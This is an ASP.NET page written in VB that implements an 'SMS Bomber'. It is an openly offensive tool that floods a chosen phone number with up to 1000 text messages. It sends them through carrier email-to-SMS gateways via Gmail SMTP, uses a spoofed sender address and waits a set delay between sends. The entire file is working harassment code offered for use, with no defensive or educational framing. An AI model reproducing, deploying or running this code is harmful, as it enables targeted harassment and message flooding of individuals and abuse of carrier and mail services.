<%@ Page Language="VB" %>

<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Mail" %>
<%@ Import Namespace="System.Diagnostics" %>
<!DOCTYPE HTML />
<script runat="Server">
    Private address, provider As String
    Private totalMessages, delay As Integer
	username = "Username"
	password = "Password"

    Private Sub sendMail(ByVal fromm As String, ByVal too As String, ByVal subjectt As String, ByVal bodyy As String)
        Dim Client As New SmtpClient("smtp.gmail.com", 587)
        Dim myCreds As New NetworkCredential("<ENTER YOUR EMAIL ADDRESS HERE", "ENTER YOUR PASSWORD HERE")

        Client.EnableSsl = True
        Client.Credentials = myCreds

	For i as Integer = 1 To totalMessages
		Try
        	    Dim mail As New MailMessage(fromm, too, subjectt, bodyy)
     	            Client.Send(mail)
		If i = 1 Then 
	            lblResult.Text = i & " message sent!"
		Else
		    lblResult.Text = i & " messages sent!"
		End If
        	Catch ex As Exception
	            lblResult.Text = "Error: " & ex.Message & too
	        End Try
		lblResult.Visible = "true"
		Pause(delay * 1000)
	Next
    End Sub

    Protected Sub btnBomb_Click1(ByVal sender As Object, ByVal e As System.EventArgs)
        Try
            totalMessages = CType(txtTimesToSend.Text, Integer)
            delay = CType(TxtTime.Text, Integer)
        Catch ex As Exception
            MsgBox("One or more of the fields are not valid.  Please try again.", MsgBoxStyle.MsgBoxSetForeground, "Invalid Fields")
            Exit Sub
        End Try
        
        provider = serviceProvider.SelectedItem.Value
        address = phone.Text + "@" + provider
        sendMail("thisisforyou@ndandp.com", address, "", txtMessage.Text)
    End Sub

    Private Sub Pause(ByVal milliseconds As Long)
    	If milliseconds <= 0 Then Return
	Dim sw As New Stopwatch()
	sw.Start()
	Dim i As Long = 0
	Do
	    If i Mod 50000 = 0 Then ' Check the timer every 50,000th iteration
                sw.Stop()
	        If sw.ElapsedMilliseconds >= milliseconds Then
	            Exit Do
	        Else
                    sw.Start()
	        End If
	    End If
	    i += 1
	Loop
    End Sub

</script>
<html>
<head runat="server">
    <title>SMS Bomber</title>
    <style type="text/css">
        #form1
        {
            width: 291px;
            height: 379px;
            margin-bottom: 0px;
            margin-left: 202px;
        }
    </style>
</head>
<body style=
	"width: 304px;
	height: 393px;
	margin-left: 50px; 
	margin-top: 50px;" 
	bgcolor="#000000"
	text="#ffffff">
    <form 
	ID="form1"
	runat="server" 
	style="border-style: solid;
	border-color: #CC3300;
	padding: 5px;
	margin: auto;">

    <div
	style="height: 42px;
	margin-top: 0px;"
	align="center" >
        
	<asp:Label 
		ID="lblTitle"
		runat="server"
		Text="SMS BOMBER"
		Font-Bold="True"
		Font-Names="Broadway"
		Font-Overline="True"
		Font-Size="XX-Large"
		Font-Underline="True"
		ForeColor="#CCFF66"></asp:Label>
    </div>

    <div 
	style="margin-left: 0px;
	width: 294px;
	height: 49px;
	margin-top: 10px;"
	align="center" >

        Phone Number to Bomb<br />

        <asp:TextBox 
		ID="phone"
		runat="server" 
		type='tel'
		pattern='\d{3}\d{3}\d{4}' 
		title='Phone Number
		Format: 9999999999'
		required>
	</asp:TextBox>
    </div>


    <div 
	style="margin-left: 0px;
	width: 294px;
	height: 48px;
	margin-top: 10px;"
	align="center">

        Their Service Provider<br />

	<asp:DropDownList
		ID="serviceProvider"
		runat="server"
		Style="margin-left: 0px;
		margin-top: 0px;"	
		Height="22px" 
		Width="140px">
			<asp:ListItem Value="tmomail.net"></asp:ListItem>	           
			<asp:ListItem Value="vmobl.com">Virgin Mobile</asp:ListItem>            
			<asp:ListItem Value="cingularme.com">Cingular</asp:ListItem>            
			<asp:ListItem Value="messaging.sprintpcs.com">Sprint</asp:ListItem>
			<asp:ListItem Value="vtext.com">Verizon</asp:ListItem>            
			<asp:ListItem Value="messaging.nextel.com">Nextel</asp:ListItem>
			<asp:ListItem Value="email.uscc.net">US Cellular</asp:ListItem>     
			<asp:ListItem Value="tms.suncom.com">SunCom</asp:ListItem>           
			<asp:ListItem Value="ptel.net">Powertel</asp:ListItem>            
			<asp:ListItem Value="txt.att.net">AT&amp;T</asp:ListItem>            
			<asp:ListItem Value="MMS.att.net">AT&amp;T MMS</asp:ListItem>           
			<asp:ListItem Value="message.alltel.com">Alltel</asp:ListItem>           
			<asp:ListItem Value="MyMetroPcs.com">Metro PCS</asp:ListItem>
	</asp:DropDownList>
    
    	
    </div>

    <div
	style="margin-left: 0px;
	width: 294px;
	height: 67px;
	margin-top: 10px;" 
	align="center">

        Message to Send<br />

	<asp:TextBox 
		ID="txtMessage"
		runat="server" 
		AutoCompleteType="Disabled" 
		MaxLength="10"
		Height="44px" 
		Width="268px">
	</asp:TextBox>
    </div>

    <div 
	style="margin-left: 0px;
	width: 294px;
	height: 46px;
	margin-top: 10px;"
	align="center">
        
	Total # of Times Sent<br />
        
	<asp:TextBox 
		ID="txtTimesToSend" 
		runat="server"
		AutoCompleteType="Disabled"
		title='Please Enter a number between 1 and 1000'
		type="number" 
		min="1"
		max="1000"
		step="1"  >
	</asp:TextBox>

        
    </div>

    <div 
	style="height: 46px;
	margin-top: 10px"
	align="center">

        Seconds Between Delivery<br />

	<asp:TextBox
		ID="TxtTime" 
		runat="server" 
		AutoCompleteType="Disabled"
		min="5" 
		max="60" 
		step ="1" 
		title='Please Enter a number between 5 and 60' >
	</asp:TextBox>

	
    </div>

    <div 
	style="margin-top: 1px"
	align="center">

        <asp:Button 
		ID="btnBomb" 
		runat="server" 
		Text="BOMB" 
		BackColor="#CCFF66" 
		Font-Names="Rockwell Extra Bold"
		Font-Size="Medium" 
		ForeColor="#FF3300" 
		Height="30px" 
		Style="margin-top: 3px;"
		Width="101px"
		BorderColor="#0A0C33"
		BorderStyle="Solid"
		OnClick="btnBomb_Click1" />

    </div>

    <div 
	style="margin-top: 1px"
	align="center">

         <asp:Label 
		ID="lblResult"
		runat="server"
		Text=""
		Visible="false">
	</asp:Label>

    </div>
    </form>
</body>
</html>